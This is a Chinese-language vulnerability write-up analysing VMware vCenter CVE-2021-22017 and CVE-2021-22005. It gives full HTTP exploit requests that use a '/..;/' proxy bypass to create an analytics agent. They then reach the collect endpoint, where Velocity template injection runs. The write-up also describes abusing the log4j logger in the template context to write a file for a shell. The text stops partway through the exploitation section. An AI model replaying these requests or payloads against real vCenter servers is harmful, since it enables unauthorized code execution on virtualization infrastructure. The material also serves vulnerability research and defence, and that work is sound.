<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>Author: lz520520@深蓝攻防实验室</p>
<h1 data-content="1" id="272148c9ce5ad67d54355138f3462ab6">CVE-2021-22017+22005模板注入分析</h1>
<p>之前分析了22005，在ceip开启情况下通过log4j写文件的利用，其实除了该漏洞点，22005还有一个collect接口的利用，通过Velocity模板注入来执行代码，但该接口可能无法访问，所以需要结合22017的rhttpproxy 绕过漏洞。<br/>
这个低版本没有 vCenter Appliance 6.7d (6.7.0.14000)<br/>
可以更新到vCenter Appliance 6.7 Update 3k (6.7.0.45100)</p>
<h2 data-content="1" id="f7e74994f1e6370debd2f76d0ada0d14">漏洞分析</h2>
<p>com.vmware.ph.phservice.cloud.dataapp.server.DataAppAgentController</p>
<h3 data-content="1" id="a79c6283c2ba4cc9a81bf6e25b6ca254">collect接口请求格式</h3>
<p>对比补丁发现发现<code>/analytics/ph/api/dataapp/agent?action=collect</code>接口被删除了，所以该接口很可能就是漏洞点，进一步跟进分析。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122405-8aa696c0-491c-1.png"/></p>
<p>这个接口有些老版本是可以直接访问的，但2021年的版本做了控制，导致不是所有版本都能访问。<br/>
所以需要绕过访问，在这次更新的补丁里有一个rhttpproxy绕过，通过/..;/可绕过，如下URL</p>
<pre><code>/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122405-8b082944-491c-1.png"/><br/>
17958471以上接口访问有问题，其他待测试。<br/>
根据接口参数要求，必须的参数是<code>_c</code>、<code>_i</code>、头部字段<code>X-Deployment-Secret</code>、以及body，body使用@RequestBody注解就表示是一个json数据，也就是<code>Content-Type: application/json</code><br/>
这里body参数collectRequestSpecJson会通过DataAppAgentRequestDeserializer.deserializeCollectRequestSpec方法进行反序列化转换成CollectRequestSpec对象，里面调用jackson做的反序列化。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122406-8b74b88e-491c-1.png"/><br/>
看下这个json数据需要哪几个参数，如下所示，有三个参数，格式可得</p>
<pre><code>{"manifestContent": "a1", "contextData": "a2", "objectId": "a3"}</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122407-8bcb5888-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122407-8c322ed2-491c-1.png"/><br/>
构造数据包发送测试</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&amp;_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span>  <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.111.11</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">test</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">64</span>
<span class="na">{"manifestContent"</span><span class="o">:</span> <span class="l">"a1", "contextData": "a2", "objectId": "a3"}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122408-8c7d9eda-491c-1.png"/><br/>
测试返回404以及错误信息，报错信息就是这部分抛出，调试下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122408-8cdd8782-491c-1.png"/><br/>
测试发现getAgent报错，agentId是通过四个参数生成，这四个参数相同才是同一个agentId。</p>
<pre><code>collectorId, collectorInstanceId, deploymentSecret, pluginType</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122409-8d584d5a-491c-1.png"/><br/>
观察this._dataAppAgentService实际是DefaultDataAppAgentManager，在这个类看到除了getAgent，还有createAgent，这里先不细究agent创建和获取的过程，但目前看起来，要调用getAgent，需要先createAgent存储一个agent。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122410-8dbf8060-491c-1.png"/></p>
<h3 data-content="1" id="87165a4eb698c8033aeef84d516b729c">agent创建和获取逻辑</h3>
<p>emmm，回头看不细究不行了，getAgent要不报错，需要以下两处都不为null</p>
<pre><code>this._agentRepository.get
this.getActiveAgent</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122411-8e1a1aca-491c-1.png"/><br/>
首先</p>
<pre><code>this._agentRepository.get</code></pre>
<p>如下会读取一个文件，如果存在就返回。<br/>
/etc/vmware-analytics/agents/vSphere.vapi.6_7.properties<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122411-8ea96950-491c-1.png"/><br/>
文件名通过getFileName方法生成，通过collectorId和pluginType组成，后缀是固定为.properties，那么可想而知createAgent里肯定有一个创建文件的地方。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122412-8ef52e76-491c-1.png"/><br/>
先看看createAgent，使用同样的this._agentRepository.get获取，文件名有就抛出异常，如果没获取到就add添加<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122412-8f3c1390-491c-1.png"/><br/>
那么添加其实就是一样的格式去创建这个文件。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122413-8f8e1668-491c-1.png"/><br/>
文件内容<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122413-8fbbfccc-491c-1.png"/><br/>
回过头再看看this.getActiveAgent，是通过agentId的equals方法来判断<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122414-8fe8a0a6-491c-1.png"/><br/>
和之前判断是一样的，需要四个参数相等才一样。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122414-90217cf0-491c-1.png"/><br/>
整理下agentId对象获取的逻辑</p>
<ol>
<li>判断配置文件是否存在<code>/etc/vmware-analytics/agents/[agentId.getCollectorId() + pluginType + ".properties"]</code>
</li>
<li>存在后判断List _activeAgents 里是否有agentId，根据他的四个属性相同判断</li>
</ol>
<p>所以在测试时，如果要根据新的agentId来测试，那么createAgent时，CollectorId或pluginType要不同，否则无法创建一个新的agentId，如果这两个参数不变，仅修改其他两个参数，是创建不成功的，就会导致获取失败。</p>
<h3 data-content="1" id="a03d52ed10f01b5d134d135a7f10b824">createAgent请求格式</h3>
<p>那么就找下是否有调用createAgent的位置，如下，然后构造一个请求包，这个接口和上面不同之处没有action参数<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122415-9087bd4e-491c-1.png"/><br/>
大概格式是，body部分是createSpecJson，会反序列化成DataAppAgentCreateSpec对象，该对象也是createAgent的一个参数。</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">test</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">250</span>
<span class="err">{}</span>
</pre></div>
<p>这个对象里是有如下属性，emmm，但需不需要这些参数，还是提交一个空的json就行，还不知道，先传入测试。</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"manifestSpec"</span><span class="p">:</span> <span class="p">{</span><span class="nt">"resourceId"</span><span class="p">:</span> <span class="s2">"b1"</span><span class="p">,</span> <span class="nt">"dataType"</span><span class="p">:</span> <span class="s2">"b2"</span><span class="p">,</span> <span class="nt">"objectId"</span><span class="p">:</span> <span class="s2">"b3"</span><span class="p">,</span> <span class="nt">"versionDataType"</span><span class="p">:</span> <span class="s2">"b4"</span><span class="p">,</span> <span class="nt">"versionObjectId"</span><span class="p">:</span> <span class="s2">"b5"</span><span class="p">},</span> <span class="nt">"objectType"</span><span class="p">:</span> <span class="s2">"a1"</span><span class="p">,</span> <span class="nt">"collectionTriggerDataNeeded"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nt">"deploymentDataNeeded"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nt">"resultNeeded"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nt">"signalCollectionCompleted"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nt">"localManifestPath"</span><span class="p">:</span> <span class="s2">"a2"</span><span class="p">,</span> <span class="nt">"localPayloadPath"</span><span class="p">:</span> <span class="s2">"a3"</span><span class="p">,</span> <span class="nt">"localObfuscationMapPath"</span><span class="p">:</span> <span class="s2">"a4"</span><span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122415-90e857c6-491c-1.png"/><br/>
最终请求包</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.111.11</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">secret</span>
<span class="na">X-Plugin-Type</span><span class="o">:</span> <span class="l">test</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">354</span>
<span class="na">{"manifestSpec"</span><span class="o">:</span> <span class="l">{"resourceId": "b1", "dataType": "b2", "objectId": "b3", "versionDataType": "b4", "versionObjectId": "b5"}, "objectType": "a1", "collectionTriggerDataNeeded": true, "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted": true, "localManifestPath": "a2", "localPayloadPath": "a3", "localObfuscationMapPath": "a4"}</span>
</pre></div>
<p>通过修改X-Plugin-Type即可创建新的agentId<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122416-913bce38-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122416-918628fc-491c-1.png"/><br/>
创建后就可正常获取了，继续跟进。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122417-91f91f7e-491c-1.png"/></p>
<h3 data-content="1" id="f3f6e69c25529365af4233cafb73b4e8">velocity执行流程</h3>
<p>createAgent后，再调用collect接口解析manifest，如下是一个manifestContent测试内容，mappingCode内容对应的Velocity模板，所以最终是一个Velocity模板注入。</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;manifest</span> <span class="na">recommendedPageSize=</span><span class="s">"500"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;request&gt;</span>
      <span class="nt">&lt;query</span> <span class="na">name=</span><span class="s">"vir:VCenter"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;constraint&gt;</span>
            <span class="nt">&lt;targetType&gt;</span>ServiceInstance<span class="nt">&lt;/targetType&gt;</span>
         <span class="nt">&lt;/constraint&gt;</span>
         <span class="nt">&lt;propertySpec&gt;</span>
            <span class="nt">&lt;propertyNames&gt;</span>content.about.instanceUuid<span class="nt">&lt;/propertyNames&gt;</span>
            <span class="nt">&lt;propertyNames&gt;</span>content.about.osType<span class="nt">&lt;/propertyNames&gt;</span>
            <span class="nt">&lt;propertyNames&gt;</span>content.about.build<span class="nt">&lt;/propertyNames&gt;</span>
            <span class="nt">&lt;propertyNames&gt;</span>content.about.version<span class="nt">&lt;/propertyNames&gt;</span>
         <span class="nt">&lt;/propertySpec&gt;</span>
      <span class="nt">&lt;/query&gt;</span>
   <span class="nt">&lt;/request&gt;</span>
   <span class="nt">&lt;cdfMapping&gt;</span>
      <span class="nt">&lt;indepedentResultsMapping&gt;</span>
         <span class="nt">&lt;resultSetMappings&gt;</span>
            <span class="nt">&lt;entry&gt;</span>
               <span class="nt">&lt;key&gt;</span>vir:VCenter<span class="nt">&lt;/key&gt;</span>
               <span class="nt">&lt;value&gt;</span>
                  <span class="nt">&lt;value</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xsi:type=</span><span class="s">"resultSetMapping"</span><span class="nt">&gt;</span>
                     <span class="nt">&lt;resourceItemToJsonLdMapping&gt;</span>
                        <span class="nt">&lt;forType&gt;</span>ServiceInstance<span class="nt">&lt;/forType&gt;</span>
                     <span class="nt">&lt;mappingCode&gt;</span><span class="cp">&lt;![CDATA[</span>

<span class="cp">                        #set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())##</span>
<span class="cp">                        #set($objectId = "vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid")##</span>
<span class="cp">                        #set($obj = $LOCAL-cdf20Result.newObject("vim.ServiceInstance", $objectId))##</span>
<span class="cp">                        $obj.addProperty("OSTYPE", "VMware can't steal this PoC")##</span>
<span class="cp">                        $obj.addProperty("BUILD", $content-about-build)##</span>
<span class="cp">                        $obj.addProperty("VERSION", $content-about-version)##]]&gt;</span>
                     <span class="nt">&lt;/mappingCode&gt;</span>
                     <span class="nt">&lt;/resourceItemToJsonLdMapping&gt;</span>
                  <span class="nt">&lt;/value&gt;</span>
               <span class="nt">&lt;/value&gt;</span>
            <span class="nt">&lt;/entry&gt;</span>
         <span class="nt">&lt;/resultSetMappings&gt;</span>
      <span class="nt">&lt;/indepedentResultsMapping&gt;</span>
   <span class="nt">&lt;/cdfMapping&gt;</span>
   <span class="nt">&lt;requestSchedules&gt;</span>
      <span class="nt">&lt;schedule</span> <span class="na">interval=</span><span class="s">"1h"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;queries&gt;</span>
            <span class="nt">&lt;query&gt;</span>vir:VCenter<span class="nt">&lt;/query&gt;</span>
         <span class="nt">&lt;/queries&gt;</span>
      <span class="nt">&lt;/schedule&gt;</span>
   <span class="nt">&lt;/requestSchedules&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</pre></div>
<p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map<br/>
跟中到如下位置，解析manifest获取mappingCode，调用VelocityHelper.executeVelocityExpression执行velocity表达式<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122418-92a27d26-491c-1.png"/><br/>
堆栈太长，完整的如下</p>
<pre><code>executeVelocityExpression:184, VelocityHelper (com.vmware.ph.phservice.collector.internal.cdf.mapping.velocity)
map:92, ResourceItemToJsonLdMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:30, ResourceItemToJsonLdMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:24, SafeMappingWrapper (com.vmware.ph.phservice.collector.internal.cdf.mapping)
applyItemMappings:85, ResultSetToCdfPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:62, ResultSetToCdfPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:26, ResultSetToCdfPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:36, IndependentResultsMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:17, IndependentResultsMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
map:109, QueryServiceCdfCollector$NamedQueryResultSetToCollectedPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf)
map:87, QueryServiceCdfCollector$NamedQueryResultSetToCollectedPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf)
apply:124, QueryServiceCollector$ResultIteratorFactory$2 (com.vmware.ph.phservice.collector.internal.data)
apply:121, QueryServiceCollector$ResultIteratorFactory$2 (com.vmware.ph.phservice.collector.internal.data)
transform:799, Iterators$8 (com.google.common.collect)
next:48, TransformedIterator (com.google.common.collect)
next:48, TransformedIterator (com.google.common.collect)
next:558, Iterators$5 (com.google.common.collect)
next:558, Iterators$5 (com.google.common.collect)
processStructuredDataCollectors:261, UsageDataCollector (com.vmware.ph.phservice.collector.internal.core)
collectAndUpload:172, UsageDataCollector (com.vmware.ph.phservice.collector.internal.core)
collect:127, UsageDataCollector (com.vmware.ph.phservice.collector.internal.core)
collectAndSend:160, SpecsCollector (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:91, SpecsCollector (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:40, ConnectionClosingCollectorWrapper (com.vmware.ph.phservice.collector.internal.core)
collect:337, DefaultCollectorDataAppAgent (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
access$201:22, PermitControlledCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
call:89, PermitControlledCollectorDataAppAgentWrapper$3 (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
call:87, PermitControlledCollectorDataAppAgentWrapper$3 (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
executeWithPermit:112, PermitControlledCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:86, PermitControlledCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
call:213, DataAppAgentController$3 (com.vmware.ph.phservice.cloud.dataapp.server)
call:204, DataAppAgentController$3 (com.vmware.ph.phservice.cloud.dataapp.server)
run:332, WebAsyncManager$5 (org.springframework.web.context.request.async)
call:511, Executors$RunnableAdapter (java.util.concurrent)
run:266, FutureTask (java.util.concurrent)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)</code></pre>
<p>新的 Velocity 版本有一些黑名单来阻止对“java.lang.Class”类方法的调用,就看上下文是否有一些变量存在操作空间。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122419-932aef08-491c-1.png"/></p>
<h3 data-content="1" id="e510c7a4dd45b5a54bd8aeb6857e97a7">velocity poc分析</h3>
<p>所以看是否可以通过velocity执行命令或上传文件</p>
<div class="highlight"><pre><span></span><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">modelKey</span> <span class="o">=</span> <span class="p">$</span><span class="nv">LOCAL</span><span class="o">-</span><span class="nf">resourceItem</span><span class="err">.</span><span class="nf">resourceItem</span><span class="err">.</span><span class="nf">getKey</span><span class="p">())</span><span class="cp">##</span><span class="x"></span>
<span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">objectId</span> <span class="o">=</span> <span class="s2">"vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid"</span><span class="p">)</span><span class="cp">##</span><span class="x"></span>
<span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">obj</span> <span class="o">=</span> <span class="p">$</span><span class="nv">LOCAL</span><span class="o">-</span><span class="nf">cdf20Result</span><span class="err">.</span><span class="nf">newObject</span><span class="p">(</span><span class="s2">"vim.ServiceInstance"</span><span class="p">,</span> <span class="p">$</span><span class="nv">objectId</span><span class="p">))</span><span class="cp">##</span><span class="x"></span>
<span class="p">$</span><span class="nv">obj</span><span class="p">.</span><span class="nv">addProperty</span><span class="p">(</span><span class="s2">"OSTYPE"</span><span class="p">,</span> <span class="s2">"VMware can't steal this PoC"</span><span class="p">)</span><span class="cp">##</span><span class="x"></span>
<span class="p">$</span><span class="nv">obj</span><span class="p">.</span><span class="nv">addProperty</span><span class="p">(</span><span class="s2">"BUILD"</span><span class="p">,</span> <span class="p">$</span><span class="nv">content</span><span class="err">-about-build</span><span class="p">)</span><span class="cp">##</span><span class="x"></span>
<span class="p">$</span><span class="nv">obj</span><span class="p">.</span><span class="nv">addProperty</span><span class="p">(</span><span class="s2">"VERSION"</span><span class="p">,</span> <span class="p">$</span><span class="nv">content</span><span class="err">-about-version</span><span class="p">)</span><span class="cp">##</span><span class="x"></span>
</pre></div>
<p>上面是公开的poc,只会回显一些系统属性，<code>$LOCAL-resourceItem</code>、<code>$content-about-build</code>、<code>$content-about-version</code>都是context里已有的变量。<br/>
这里通过调试获取context里的属性做测试，测试代码如下</p>
<div class="highlight"><pre><span></span><span class="n">Field</span> <span class="n">contextF</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.apache.velocity.VelocityContext"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
<span class="n">contextF</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">HashMap</span> <span class="n">m</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">contextF</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">velocityInvocationContext</span><span class="o">.</span><span class="na">velocityContext</span><span class="o">);</span>
<span class="n">NamedPropertiesResourceItem</span> <span class="n">namedPropertiesResourceItem</span> <span class="o">=</span> <span class="o">(</span><span class="n">NamedPropertiesResourceItem</span><span class="o">)</span> <span class="n">m</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"LOCAL-resourceItem"</span><span class="o">);</span>
<span class="n">namedPropertiesResourceItem</span><span class="o">.</span><span class="na">getResourceItem</span><span class="o">().</span><span class="na">getKey</span><span class="o">();</span>
</pre></div>
<p>$LOCAL-resourceItem.resourceItem.getKey()，这里使用了两种方式获取对象属性，getKey()就是对象自带的方法，而如果是resourceItem，就会自动调用getResourceItem()来获取属性，毕竟<code>_resourceItem</code>是私有属性，没法直接获取。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122420-9388376c-491c-1.png"/><br/>
从第二行的<code>$modelKey.value:$modelKey.serverGuid</code>也能看出<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122420-93d6e02e-491c-1.png"/><br/>
所以改成这样也是可以执行的<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122421-94377a7e-491c-1.png"/><br/>
或<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122421-94971de4-491c-1.png"/><br/>
$LOCAL-cdf20Result变量可获取VelocityJsonLd，该类最终会转换成返回的json数据。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122422-94fac722-491c-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">VelocityHelper</span><span class="o">.</span><span class="na">executeVelocityExpression</span><span class="o">(</span><span class="s">"#set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())##\n"</span> <span class="o">+</span>
                <span class="s">"#set($objectId = \"vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid\")##\n"</span> <span class="o">+</span>
                <span class="s">"#set($obj = $LOCAL-cdf20Result.newObject(\"vim.ServiceInstance\", $objectId))##\n"</span> <span class="o">+</span>
                <span class="s">"$obj.addProperty(\"OSTYPE\", \"VMware can't steal this PoC\")##\n"</span> <span class="o">+</span>
                <span class="s">"$obj.addProperty(\"BUILD\", $content-about-build)##\n"</span> <span class="o">+</span>
                <span class="s">"$obj.addProperty(\"VERSION\", $content-about-version)##"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">velocityInvocationContext</span><span class="o">.</span><span class="na">velocityEngine</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">velocityInvocationContext</span><span class="o">.</span><span class="na">velocityContext</span><span class="o">,</span> <span class="n">logTag</span><span class="o">);</span>
<span class="k">this</span><span class="o">.</span><span class="na">velocityInvocationContext</span><span class="o">.</span><span class="na">velocityJsonLd</span><span class="o">.</span><span class="na">object</span><span class="o">;</span>
</pre></div>
<p>转换成json返回<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122423-955c9006-491c-1.png"/></p>
<h3 data-content="1" id="0e4c76d0b90ba6e12dc9bdb9e9c7fff8">velocity GLOBAL-logger利用构造</h3>
<p>既然已经清楚了poc是怎么构造的，那么如何getshell，自然是从context里已有的变量里下手，其中注意到有个<code>GLOBAL-logger</code>,是log4j的实例，之前分析的漏洞点就是通过log4j写文件的。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122423-95c198c0-491c-1.png"/><br/>
我们调试下看看效果，先尝试获取该变量。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122424-96173c6c-491c-1.png"/><br/>
log4j的配置文件路径/etc/vmware-analytics/log4j.properties，log4j日志路径在配置文件里写死了。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122424-96624e5a-491c-1.png"/><br/>
然后查一下log4j运行时怎么修改日志路径。<br/>
<a href="https:_www.cnblogs.com_xiaohu-v587_p_8463814" target="_blank">https://www.cnblogs.com/xiaohu-v587/p/8463814.html</a><br/>
当然这个代码是log4j里的，和common-logging包里的还有些差别，但问题不大，可参考这个编写velocity代码。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122425-96868e28-491c-1.png"/><br/>
成功写入<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122425-969b8206-491c-1.png"/><br/>
另外简单看了上下文其他几个变量，也没有利用点，如果有大佬发现可一起讨论。</p>
<h2 data-content="1" id="df762bf6efe7df136b4d91746de4f5a6">漏洞验证</h2>
<p>返回201，createAgent接口存在，并且创建agent成功，每次请求需要修改X-Plugin-Type</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.111.11</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">secret</span>
<span class="na">X-Plugin-Type</span><span class="o">:</span> <span class="l">MoWtrXYtWo</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="err">{}</span>
</pre></div>
<p>返回200，collectAgent接口存在，每次请求需要修改X-Plugin-Type</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&amp;_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.111.11</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">X-Deployment-Secret</span><span class="o">:</span> <span class="l">secret</span>
<span class="na">X-Plugin-Type</span><span class="o">:</span> <span class="l">MoWtrXYtWo</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="err">{}</span>
</pre></div>
<h2 data-content="1" id="d03e0789a4047aeea5d72be18079c814">漏洞利用</h2>
<p>createAgent<br/>
每次请求修改X-Plugin-Type</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&amp;_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.111.11</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
